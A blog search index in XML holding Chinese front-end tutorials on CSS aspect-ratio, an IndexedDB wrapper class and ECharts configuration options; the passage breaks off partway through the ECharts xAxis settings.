<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>div根据屏幕缩放进行比例缩放</title>
    <url>/CSS/aspect-ratio%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[<h1>项目场景：</h1>
<p>在一些视频类网站，视频的 div 宽度会跟随浏览器的大小进行比例缩放，一般来说，我们 div 设置宽度 100% ， 高度写死，宽度可以根据屏幕缩小而改变 div 的宽度，但是高度不会变化，如果想要 div 的高度也随着宽度的变化而变化呢？</p>
<hr>
<h1>解决方案：aspect-ratio</h1>
<p>aspect-ratio 是 CSS 媒体属性 可以用来测试 viewport 的宽高比。例子如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.test</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#f36</span>;</span><br><span class="line">  aspect-ratio: <span class="number">16</span>/<span class="number">9</span>; <span class="comment">/**  这里可以设置 成你想要的比例*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>兼容性</h1>
<p>目前的兼容性还是可以的<br>
<img src="https://img-blog.csdnimg.cn/19c617d3db7b4e91b7deb06256cf54fb.png" alt="在这里插入图片描述"></p>
<h1>更多</h1>
<p>如果想了解这个属性的更多知识，可以点击<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/@media/aspect-ratio">了解更多</a></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>indexDB操作封装</title>
    <url>/JavaScript/indexDB%E5%B0%81%E8%A3%85/</url>
    <content><![CDATA[<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">DB</span> &#123;</span><br><span class="line">  <span class="attr">option</span>: &#123;&#125;</span><br><span class="line"></span><br><span class="line">  db = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">option</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">option</span> = option</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 打开数据库</span></span><br><span class="line">  openDB = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> db =</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">indexedDB</span> ||</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">mozIndexedDB</span> ||</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">webkitIndexedDB</span> ||</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">msIndexedDB</span></span><br><span class="line">    <span class="keyword">if</span> (!db) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;浏览器不支持indexedDB&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> request = db.<span class="title function_">open</span>(<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">name</span>, <span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">version</span>)</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;打开数据库&#x27;</span>, request)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      request.<span class="property">onsuccess</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">db</span> = e?.<span class="property">target</span>?.<span class="property">result</span></span><br><span class="line">        <span class="title function_">resolve</span>(e?.<span class="property">target</span>?.<span class="property">result</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      request.<span class="property">onerror</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(e?.<span class="property">target</span>?.<span class="property">error</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      request.<span class="property">onupgradeneeded</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">db</span> = e?.<span class="property">target</span>?.<span class="property">result</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">db</span>.<span class="title function_">createObjectStore</span>(<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">storeName</span>, &#123;</span><br><span class="line">          <span class="attr">keyPath</span>: <span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">key</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 添加数据</span></span><br><span class="line">  addData = <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> store = <span class="variable language_">this</span>.<span class="property">db</span></span><br><span class="line">      ?.<span class="title function_">transaction</span>(<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">storeName</span>, <span class="string">&#x27;readwrite&#x27;</span>)</span><br><span class="line">      ?.<span class="title function_">objectStore</span>(<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">storeName</span>)</span><br><span class="line">    <span class="keyword">const</span> request = store?.<span class="title function_">get</span>(data[<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">key</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      request.<span class="property">onsuccess</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e?.<span class="property">target</span>?.<span class="property">result</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">updateDB</span>(data)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> request = store?.<span class="title function_">add</span>(data)</span><br><span class="line">          request.<span class="property">onsuccess</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">resolve</span>(e?.<span class="property">target</span>?.<span class="property">result</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          request.<span class="property">onerror</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">reject</span>(e?.<span class="property">target</span>?.<span class="property">error</span>)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      request.<span class="property">onerror</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(e?.<span class="property">target</span>?.<span class="property">error</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 修改数据</span></span><br><span class="line">  <span class="title function_">updateDB</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> store = <span class="variable language_">this</span>.<span class="property">db</span></span><br><span class="line">      ?.<span class="title function_">transaction</span>(<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">storeName</span>, <span class="string">&#x27;readwrite&#x27;</span>)</span><br><span class="line">      ?.<span class="title function_">objectStore</span>(<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">storeName</span>)</span><br><span class="line">    <span class="keyword">const</span> request = store?.<span class="title function_">put</span>(data)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      request.<span class="property">onsuccess</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(e?.<span class="property">target</span>?.<span class="property">result</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      request.<span class="property">onerror</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(e?.<span class="property">target</span>?.<span class="property">error</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取数据</span></span><br><span class="line">  <span class="title function_">get</span>(<span class="params">key</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> transaction = <span class="variable language_">this</span>.<span class="property">db</span>.<span class="title function_">transaction</span>(<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">storeName</span>) <span class="comment">// 事务</span></span><br><span class="line">    <span class="keyword">const</span> objectStore = transaction.<span class="title function_">objectStore</span>(<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">storeName</span>) <span class="comment">// 仓库对象</span></span><br><span class="line">    <span class="keyword">const</span> request = objectStore.<span class="title function_">get</span>(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      request.<span class="property">onsuccess</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(e?.<span class="property">target</span>?.<span class="property">result</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      request.<span class="property">onerror</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(e?.<span class="property">target</span>?.<span class="property">error</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除数据</span></span><br><span class="line">  <span class="title function_">delete</span>(<span class="params">key</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> transaction = <span class="variable language_">this</span>.<span class="property">db</span>.<span class="title function_">transaction</span>(<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">storeName</span>, <span class="string">&#x27;readwrite&#x27;</span>) <span class="comment">// 事务</span></span><br><span class="line">    <span class="keyword">const</span> objectStore = transaction.<span class="title function_">objectStore</span>(<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">storeName</span>) <span class="comment">// 仓库对象</span></span><br><span class="line">    <span class="keyword">const</span> request = objectStore.<span class="title function_">delete</span>(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      request.<span class="property">onsuccess</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(e?.<span class="property">target</span>?.<span class="property">result</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      request.<span class="property">onerror</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(e?.<span class="property">target</span>?.<span class="property">error</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 清空数据</span></span><br><span class="line">  <span class="title function_">clear</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> transaction = <span class="variable language_">this</span>.<span class="property">db</span>.<span class="title function_">transaction</span>(<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">storeName</span>, <span class="string">&#x27;readwrite&#x27;</span>) <span class="comment">// 事务</span></span><br><span class="line">    <span class="keyword">const</span> objectStore = transaction.<span class="title function_">objectStore</span>(<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">storeName</span>) <span class="comment">// 仓库对象</span></span><br><span class="line">    <span class="keyword">const</span> request = objectStore.<span class="title function_">clear</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      request.<span class="property">onsuccess</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(e?.<span class="property">target</span>?.<span class="property">result</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      request.<span class="property">onerror</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(e?.<span class="property">target</span>?.<span class="property">error</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取所有数据</span></span><br><span class="line">  <span class="title function_">getAll</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> transaction = <span class="variable language_">this</span>.<span class="property">db</span>.<span class="title function_">transaction</span>(<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">storeName</span>) <span class="comment">// 事务</span></span><br><span class="line">    <span class="keyword">const</span> objectStore = transaction.<span class="title function_">objectStore</span>(<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">storeName</span>) <span class="comment">// 仓库对象</span></span><br><span class="line">    <span class="keyword">const</span> request = objectStore.<span class="title function_">getAll</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      request.<span class="property">onsuccess</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(e?.<span class="property">target</span>?.<span class="property">result</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      request.<span class="property">onerror</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(e?.<span class="property">target</span>?.<span class="property">error</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取数据大小</span></span><br><span class="line">  <span class="title function_">getSize</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> transaction = <span class="variable language_">this</span>.<span class="property">db</span>.<span class="title function_">transaction</span>(<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">storeName</span>) <span class="comment">// 事务</span></span><br><span class="line">    <span class="keyword">const</span> objectStore = transaction.<span class="title function_">objectStore</span>(<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">storeName</span>) <span class="comment">// 仓库对象</span></span><br><span class="line">    <span class="keyword">const</span> request = objectStore.<span class="title function_">count</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      request.<span class="property">onsuccess</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(e?.<span class="property">target</span>?.<span class="property">result</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      request.<span class="property">onerror</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(e?.<span class="property">target</span>?.<span class="property">error</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 关闭数据库</span></span><br><span class="line">  <span class="title function_">closeDB</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">db</span>?.<span class="title function_">close</span>()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除数据库</span></span><br><span class="line">  <span class="title function_">deleteDB</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> db =</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">indexedDB</span> ||</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">mozIndexedDB</span> ||</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">webkitIndexedDB</span> ||</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">msIndexedDB</span></span><br><span class="line">    db.<span class="title function_">deleteDatabase</span>(<span class="variable language_">this</span>.<span class="property">option</span>.<span class="property">name</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>Echarts使用心得</title>
    <url>/JavaScript/Echarts%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<h1>前言</h1>
<p>Echarts 是一个 JavaScript 的开源可视化图表库，可以快速画出许多图形，我们有时候会用到它，但是官方教程对于新手来说确实不友好，至少在我看来是这样的，看了我几天才大概有所了解，为了加深记忆，故在此记下，方便日后忘记可以回来查看</p>
<hr>
<h1>一、基础画图</h1>
<p>基础画一个图，首先要知道的是重点在于配置项<strong>setOption</strong>,现在先不急了解，我们先简单画一个图<br>
<br></p>
<p><strong>1</strong>、在页面创建一个 div 标签，id 值为 myChart</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;myChart&quot;</span> <span class="attr">style</span>=<span class="string">&quot;&quot;</span><span class="attr">width:300px</span>;<span class="attr">height:300px</span>;&quot;&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<br>
<p><strong>2</strong>、引入 echarts.js 并绘画，echats.js 的 <a href="https://github.com/apache/echarts">Github 下载地址</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化echarts实例</span></span><br><span class="line"><span class="keyword">var</span> myChart = echarts.<span class="title function_">init</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myChart&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定图表的配置项和数据</span></span><br><span class="line"><span class="keyword">var</span> option = &#123;</span><br><span class="line">  <span class="attr">xAxis</span>: &#123;</span><br><span class="line">    <span class="attr">data</span>: [<span class="string">&#x27;衬衫&#x27;</span>, <span class="string">&#x27;羊毛衫&#x27;</span>, <span class="string">&#x27;雪纺衫&#x27;</span>, <span class="string">&#x27;裤子&#x27;</span>, <span class="string">&#x27;高跟鞋&#x27;</span>, <span class="string">&#x27;袜子&#x27;</span>],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">yAxis</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">series</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;销量&#x27;</span>,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&#x27;bar&#x27;</span>,</span><br><span class="line">      <span class="attr">data</span>: [<span class="number">5</span>, <span class="number">20</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">20</span>],</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用刚指定的配置项和数据显示图表。</span></span><br><span class="line">myChart.<span class="title function_">setOption</span>(option)</span><br></pre></td></tr></table></figure>
<br>
<p><strong>3</strong>、一开始还是挺好理解的，就是这两个步骤,你也可以选择封装一下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Echarts绘画</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">String</span>&#125; id       元素id值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Object</span>&#125; option   配置项</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_Chart</span>(<span class="params">id, option</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> myChart = echarts.<span class="title function_">init</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(id))</span><br><span class="line">  myChart.<span class="title function_">setOption</span>(option)</span><br><span class="line">  <span class="keyword">return</span> myChart <span class="comment">// 有需要就返回，不需要可以去除</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>把上面第 2 步简化一下就是：(option 和第 2 步的 option 相同，这里就不写了）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">_Chart</span>(<span class="string">&#x27;myChart&#x27;</span>, option)</span><br></pre></td></tr></table></figure>
<p>有时候如果宽高不设死需要自适应，可以使用 <strong>resize()</strong> 方法，这时候 <strong>return myChart</strong> 的作用就出来了,这里就不写配置项 option 了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myChart = <span class="title function_">_Chart</span>(<span class="string">&#x27;myChart&#x27;</span>, option)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 简体页面宽高发生改变，使得Echarts所画图表自动适应</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_Resize</span>(<span class="params"></span>) &#123;</span><br><span class="line">  myChart.<span class="title function_">resize</span>()</span><br><span class="line">  <span class="comment">// ...这里可以写更多的图表自适应，如：myChart1.resize()、myChart2.resize()</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;resize&#x27;</span>, _Resize)</span><br></pre></td></tr></table></figure>
<p>如果觉得麻烦，就用第 2 步就行，下面重点介绍配置项<strong>setOption</strong></p>
<br>
<h1>二、配置项 setOption</h1>
<p>下面这些为本人所用过的以及一些个人理解，如有错误还请看：<a href="https://echarts.apache.org/zh/option.html#title">官网配置项详情</a>，也可以边看此文和官网一起学习</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> option = &#123;</span><br><span class="line">  <span class="attr">title</span>: &#123;&#125;, <span class="comment">// 标题</span></span><br><span class="line">  <span class="attr">legend</span>: &#123;&#125;, <span class="comment">// 图例（不知道怎么解释，看官网吧，那里有试一试）</span></span><br><span class="line">  <span class="attr">grid</span>: &#123;&#125;, <span class="comment">// 网格，这个可以控制图表的位置，设置图表上下左右的距离</span></span><br><span class="line">  <span class="attr">xAxis</span>: &#123;&#125;, <span class="comment">// X轴，这个用来设置X轴的</span></span><br><span class="line">  <span class="attr">yAxis</span>: &#123;&#125;, <span class="comment">// Y轴，这个用来设置Y轴的</span></span><br><span class="line">  <span class="attr">tooltip</span>: &#123;&#125;, <span class="comment">// 提示框， 鼠标滑过提示信息（我是这么认为的）</span></span><br><span class="line">  <span class="attr">toolbox</span>: &#123;&#125;, <span class="comment">// 工具栏,显示一下控件，如：导出图片，数据视图，动态类型切换，数据区域缩放，重置</span></span><br><span class="line">  <span class="attr">series</span>: [], <span class="comment">// 暂且称为数据配置吧，这里主要是决定你要画什么图形和一些数据以及配置的，如：柱形图、折线图</span></span><br><span class="line">  <span class="attr">backgroundColor</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// 背景色，设置画布的背景色，默认为透明</span></span><br><span class="line">  <span class="attr">textStyle</span>: &#123;&#125;, <span class="comment">// 全局的字体样式，写在最外面就是全局配置，写在里面就是局部</span></span><br><span class="line">  <span class="attr">darkMode</span>: <span class="literal">false</span>, <span class="comment">// 是否是暗黑模式</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...... 暂时我用过的就这么点，想看更多的可以自己看看官网</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面一些为我常用配置，并未盖全，更多可以看：<a href="https://echarts.apache.org/zh/option.html#title">官网配置项详情</a></p>
<h2 id="1、title">1、title</h2>
<p>title 是该画布的标题，包含主标题和副标题,里面配置项有</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">title</span>:&#123;</span><br><span class="line">	 <span class="attr">show</span>:<span class="literal">true</span>,   	  	<span class="comment">// 隐藏或显示标题  true-显示 false-隐藏</span></span><br><span class="line">	 <span class="attr">text</span>:<span class="string">&#x27;&#x27;</span>,			<span class="comment">// 标题文本</span></span><br><span class="line">	 <span class="attr">textStyle</span>:&#123;  		<span class="comment">// 局部字体样式，写在最外面就是全局配置，写在里面就是局部</span></span><br><span class="line">	 	<span class="attr">color</span>:<span class="string">&#x27;&#x27;</span>,		<span class="comment">// 文字颜色</span></span><br><span class="line">	 	<span class="attr">fontStyle</span>:<span class="string">&#x27;&#x27;</span>,	<span class="comment">// 文字风格 normal-普通 italic-斜体 oblique-类似于斜体</span></span><br><span class="line">	 	<span class="attr">fontSize</span>:<span class="string">&#x27;&#x27;</span>,	<span class="comment">// 字体大小</span></span><br><span class="line">	 	<span class="comment">// ............更多请看官网</span></span><br><span class="line">	 &#125;,</span><br><span class="line">	 <span class="attr">textAlign</span>:<span class="string">&#x27;&#x27;</span>,		<span class="comment">// 对齐方式，默认 auto，可选: left-左 center-中 ringht-右</span></span><br><span class="line">	 <span class="attr">top</span>:<span class="number">0</span>,				<span class="comment">// 标题距离顶部的距离，默认auto 既然有了 top 那么肯定还有 left,right,bottom,这里不一一介绍了</span></span><br><span class="line">	 <span class="comment">// ......更多请看官网</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2、legend">2、legend</h2>
<p>官方解释：图例组件展现了不同系列的标记(symbol)，颜色和名字。可以通过点击图例控制哪些系列不显示。不懂可以看看上面那个官网地址那里面的试一试</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">legend</span>:&#123;</span><br><span class="line">	<span class="attr">show</span>:<span class="literal">true</span>,			<span class="comment">// 隐藏或显示 true-显示 false-隐藏</span></span><br><span class="line">	<span class="attr">type</span>:<span class="string">&#x27;plain&#x27;</span>, 		<span class="comment">// 图例的类型（没怎么用过，我也分不清他俩有啥区别）plain-普通图例 scroll-可滚动翻页的图例</span></span><br><span class="line">	<span class="attr">left</span>:<span class="string">&#x27;auto&#x27;</span>,		<span class="comment">// 图例组件离容器左侧的距离,同样有 top,right,bottom</span></span><br><span class="line">	<span class="attr">orient</span>:<span class="string">&#x27;&#x27;</span>, 			<span class="comment">// 图例列表的布局朝向 horizontal-水平 vertical-垂直</span></span><br><span class="line">	<span class="attr">itemGap</span>:<span class="number">10</span>,			<span class="comment">// 图例每项之间的间隔</span></span><br><span class="line">	<span class="attr">itemWidth</span>:<span class="number">25</span>,		<span class="comment">// 图例标记的图形宽度</span></span><br><span class="line">	<span class="comment">// ......更多请看官网</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3、grid">3、grid</h2>
<p>直角坐标系内绘图网格，单个 grid 内最多可以放置上下两个 X 轴，左右两个 Y 轴。这个可以控制图表的位置，设置图表上下左右的距离</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">grid</span>:&#123;</span><br><span class="line">	 <span class="attr">show</span>:<span class="literal">false</span>, 	<span class="comment">// 隐藏或显示 true-显示 false-隐藏</span></span><br><span class="line">	 <span class="attr">left</span>:<span class="number">20</span>,		<span class="comment">// grid 组件离容器左侧的距离 top,right,bottom</span></span><br><span class="line">	 <span class="comment">// ......更多请看官网 一般我就用这几个属性</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="4、xAxis">4、xAxis</h2>
<p>图表的 X 轴</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">xAxis</span>:&#123;</span><br><span class="line">	<span class="attr">show</span>:<span class="literal">false</span>, 	<span class="comment">// 隐藏或显示 true-显示 false-隐藏</span></span><br><span class="line">	<span class="attr">type</span>:<span class="string">&#x27;&#x27;</span>,		<span class="comment">// 坐标类型 value- 数值轴 category-类目轴 time-时间轴 log-对数轴</span></span><br><span class="line">	<span class="attr">name</span>:<span class="string">&#x27;&#x27;</span>,		<span class="comment">// 坐标轴名称</span></span><br><span class="line">	<span class="attr">nameLocation</span>:<span class="string">&#x27;&#x27;</span>,<span class="comment">// 坐标轴名称显示位置 start-开头 middle或center-中间 end-末尾</span></span><br><span class="line">	<span class="attr">nameTextStyle</span>:&#123;&#125;,<span class="comment">// 坐标轴名称的文字样式</span></span><br><span class="line">	<span class="attr">nameGap</span>:<span class="number">10</span>,		<span class="comment">// 坐标轴名称与轴线之间的距离</span></span><br><span class="line">	<span class="attr">min</span>:<span class="number">0</span>,			<span class="comment">// 坐标轴刻度最小值</span></span><br><span class="line">	<span class="attr">max</span>:<span class="number">0</span>,			<span class="comment">// 坐标轴刻度最大值</span></span><br><span class="line">	<span class="attr">axisLine</span>:&#123;		<span class="comment">// 坐标轴轴线相关设置</span></span><br><span class="line">		<span class="attr">lineStyle</span>:&#123;			<span class="comment">// 坐标线条样式</span></span><br><span class="line">			 <span class="attr">color</span>:<span class="string">&#x27;&#x27;</span>,		<span class="comment">// 线条颜色</span></span><br><span class="line">			 <span class="attr">width</span>:<span class="number">1</span>,		<span class="comment">// 线条宽度</span></span><br><span class="line">			 <span class="comment">// ......更多请看官网 一般我就用这几个属性</span></span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">axisTick</span>:&#123;	 <span class="comment">// 坐标轴刻度相关设置</span></span><br><span class="line">		<span class="attr">show</span>:<span class="literal">true</span>,   			<span class="comment">// 显示隐藏</span></span><br><span class="line">		